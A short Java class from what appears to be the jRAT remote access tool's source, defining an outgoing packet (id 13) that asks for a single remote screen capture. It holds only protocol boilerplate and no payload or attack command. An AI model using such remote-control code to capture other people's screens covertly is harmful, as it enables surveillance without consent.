package pro.jrat.packets.outgoing;


public class Packet13OneRemoteScreen extends Packet12RemoteScreen {

	public Packet13OneRemoteScreen(double size, int monitor, int rows, int cols) {
		super(size, monitor, rows, cols);
	}

	@Override
	public byte getPacketId() {
		return 13;
	}

}
